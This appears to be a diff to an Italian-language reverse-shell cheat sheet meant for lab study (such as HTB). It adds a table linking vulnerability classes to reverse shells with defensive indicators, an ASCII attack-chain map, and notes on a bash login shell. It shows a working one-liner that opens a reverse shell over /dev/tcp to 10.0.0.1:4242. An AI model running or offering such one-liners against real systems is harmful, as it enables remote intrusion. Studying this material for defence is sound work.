@@ -2,7 +2,7 @@
 Il materiale ha solo scopo di studio non si intende diffondere codice dnnoso. Utilizzare solo in contesti isolati come ad esempio HTB.
 
 ## Summary
-
+* [When](#when)
 * [Tools](#tools)
 * [Reverse Shell](#reverse-shell)
     * [Awk](#awk)
@@ -40,6 +40,50 @@ Il materiale ha solo scopo di studio non si intende diffondere codice dnnoso. Ut
     * [Other platforms](#other-platforms)
 * [Spawn TTY Shell](#spawn-tty-shell)
 * [References](#references)
+
+## When
+
+## Tabella riassuntiva
+
+| Vulnerabilità             | Come può portare a una reverse shell | Indicatori per la difesa                  |
+|----------------------------|--------------------------------------|-------------------------------------------|
+| **Command Injection**      | Inserendo una one-liner al posto di un comando legittimo. | Input non sanitizzati, comandi strani in log applicativi. |
+| **Remote Code Execution**  | Bug in app o servizi che consentono esecuzione arbitraria. | Crash inspiegabili, processi inusuali (bash, python) avviati da webserver. |
+| **File Upload non sicuro** | Caricando uno script (es. PHP/JSP) che apre una shell. | File sospetti in cartelle upload, esecuzioni anomale da directory non standard. |
+| **LFI/RFI** (File Inclusion) | Inclusione di script malevoli che eseguono codice. | Accessi log a file `.php`, `.jsp` non previsti, errori “include()” frequenti. |
+| **Interpreter Abuse**      | Uso di interpreti (Python, Perl, PHP) per eseguire socket e shell. | Processi di interpreti avviati da servizi che non dovrebbero usarli. |
+| **Deserializzazione insicura** | Caricamento di payload che aprono connessioni reverse. | Log applicativi con input binario sospetto, connessioni outbound insolite. |
+| **Servizi vulnerabili**    | Exploit noti su CMS, framework o server vecchi. | Versioni software non aggiornate, connessioni anomale a porte non standard. |
+
+## Mappa ASCII – Catena logica delle vulnerabilità
+
+```
+Vulnerabilità
+│
+├── Command Injection
+│     └── Esecuzione comandi singoli
+│           └── Inserimento one-liner → Reverse Shell
+│
+├── File Upload non sicuro
+│     └── Upload di webshell (PHP/JSP/ASPX)
+│           └── Invio comando socket → Reverse Shell
+│
+├── LFI/RFI (File Inclusion)
+│     └── Inclusione di script malevolo
+│           └── Codice eseguito → Reverse Shell
+│
+├── Remote Code Execution (RCE)
+│     └── Deserializzazione / bug software
+│           └── Payload con socket → Reverse Shell
+│
+├── Interpreter Abuse
+│     └── Invocazione Python / Perl / PHP da applicazione
+│           └── Script socket → Reverse Shell
+│
+└── Servizi vulnerabili (CMS, framework, server)
+      └── Exploit pubblico
+            └── Shell remota → Reverse Shell
+```
 
 ## Tools
 
@@ -128,6 +172,11 @@ Questo comando crea una **reverse shell compatta**:
 
 
 /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
+### `/bin/bash -l`
+
+- Avvia una nuova shell **Bash** in modalità **login shell**.  
+- In questa modalità vengono letti i file di configurazione come `~/.bash_profile` o `~/.profile`.  
+- È utile quando serve un ambiente più completo rispetto a una shell non-login.
 ```
 
 ### Bash UDP
